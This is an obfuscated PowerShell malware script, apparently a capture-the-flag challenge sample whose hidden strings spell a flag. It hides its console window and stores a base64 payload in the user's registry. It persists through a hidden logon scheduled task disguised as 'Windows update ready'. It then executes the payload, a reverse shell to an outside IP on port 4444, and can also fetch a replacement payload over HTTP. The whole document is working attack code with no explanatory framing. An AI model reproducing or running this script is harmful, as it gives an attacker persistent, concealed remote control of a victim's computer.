. ( $PshomE[4]+$pshoMe[30]+'x') ( [strinG]::join('' , ([REGeX]::MaTCHES( ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(" ,'.' ,'R'+'iGHTtOl'+'eft' ) | FoREaCH-OBJecT {$_.VALUE} ))  )


$payloadBase64 = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADYALgAyADMAMwAzAC4ANQA0AC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==";


SEt ("G8"+"h")  (  " ) )63]Rahc[,'raZ'EcalPeR-  43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}atem_we'+'n_eht'+'_2N1 = n'+'gerr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . "  ) ;-jOIn ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue[ - 1.. - ( ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue.LengtH)] | IeX 

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
';
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0);


if ($payloadBase64 -match "http:|https:") {
    $payloadBase64 = (New-Object "Net.Webclient").DownloadString($payloadBase64);
}

$installed = Get-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -ea SilentlyContinue;


if ($installed) {


    if ($installed -ne $payloadBase64) {
        Set-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -Force -Value $payloadBase64;
    }

# installation
} else {
    

    if ($FALSE -eq (Test-Path -Path "HKCU:\Software\$($regp)\")) {
        New-Item -Path "HKCU:\Software\$($regp)";
    }
    Set-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -Force -Value $payloadBase64;
    
    
    $u = [Environment]::UserName;
    
    
    $task = Get-ScheduledTask -TaskName "$($regp)$($regn)" -ea SilentlyContinue;
    if ($task) {
        Unregister-ScheduledTask -TaskName "$($regp)$($regn)" -Confirm:$false;
    }
    
    
    $a = New-ScheduledTaskAction -Execute "powershell.exe" "-w hidden -ExecutionPolicy Bypass -nop -NoExit -C Write-host 'Windows update ready'; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software\$($regp)).$($regn))));";
    $t = New-ScheduledTaskTrigger -AtLogOn -User "$($u)";
    $p = New-ScheduledTaskPrincipal "$($u)";
    $s = New-ScheduledTaskSettingsSet -Hidden;
    $d = New-ScheduledTask -Action $a -Trigger $t -Principal $p -Settings $s;
    Register-ScheduledTask "$($regp)$($regn)" -InputObject $d;
}


iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payloadBase64)));

